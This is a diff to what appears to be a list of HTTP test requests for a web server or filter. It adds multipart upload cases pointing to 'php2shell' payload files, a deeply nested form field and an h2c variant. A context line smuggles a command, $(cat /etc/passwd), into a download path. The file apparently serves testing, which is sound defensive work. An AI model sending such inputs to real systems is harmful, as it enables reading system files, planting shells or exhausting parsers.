@@ -4439,4 +4439,18 @@ GET /download?path=uploads/$(cat%20/etc/passwd).mp4
 POST /upload header="Content-Type: multipart/form-data; boundary=X" body_file=payloads/php2shell-nested-empty-file.txt
 POST /upload header="Content-Type: multipart/form-data; boundary=X" body_file=payloads/php2shell-nested-empty-file-min.txt
 POST /upload header="Content-Type: multipart/form-data; boundary=X" body_file=payloads/php2shell-nested-empty-file-reordered.txt
+POST /upload header="Content-Type: multipart/form-data; boundary=X" body_file=payloads/php2shell-unquoted-name.txt
+POST /upload header="Content-Type: multipart/form-data; boundary=X" body_file=payloads/php2shell-spaced-value.txt
+POST /upload header="Content-Type: multipart/form-data; boundary=X" body_file=payloads/php2shell-single-quotes.txt
+POST /upload header="Content-Type: multipart/form-data; boundary=X" body_file=payloads/php2shell-empty-index.txt
+POST /upload header="Content-Type: multipart/form-data; boundary=X" body_file=payloads/php2shell-long-index.txt
+POST /upload header="Content-Type: multipart/form-data; boundary=X" body_file=payloads/php2shell-disposition-padding.txt
+POST /upload header="Content-Type: multipart/form-data; boundary=X" body_file=payloads/php2shell-part-headers.txt
+POST /upload header="Content-Type: multipart/form-data; boundary=X" body_file=payloads/php2shell-part-header-bytes.txt
+POST /upload header="Content-Type: multipart/form-data; boundary=X" body_file=payloads/php2shell-deep-field.txt
+POST /upload header="Content-Type: multipart/form-data; boundary=X" body_file=payloads/php2shell-long-field.txt
+POST /upload header="Content-Type: multipart/form-data; boundary=X" body_file=payloads/php2shell-empty-file-count.txt
+POST /submit header="Content-Type: application/x-www-form-urlencoded" body="root[a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a]=ok"
+POST /submit header="Content-Type: application/x-www-form-urlencoded" body_file=payloads/php2shell-form-field-count.txt
+POST /upload proto=h2c header="Content-Type: multipart/form-data; boundary=X" body_file=payloads/php2shell-unquoted-name.txt
 POST /upload header="Content-Encoding: gzip" header="Content-Type: multipart/form-data; boundary=X" bodyhex=1f8b0800000000000203edcd310ac3300c05d0dde03b18efa27b42a7f6081d0ac683ea2820882d136be9ed8be9d0b117107ffb1ffe03787a7793a6d414ee3cba0c5696b6845dce0a1b2aaea161a56bdcf9a09130a7574e25a72dc735cceebbc6dfcde3dd6909d8fbc105e7d9458a92c2d093b07a3703e69a6baeb9e6fe7301bcfb009d6917d1a7050000
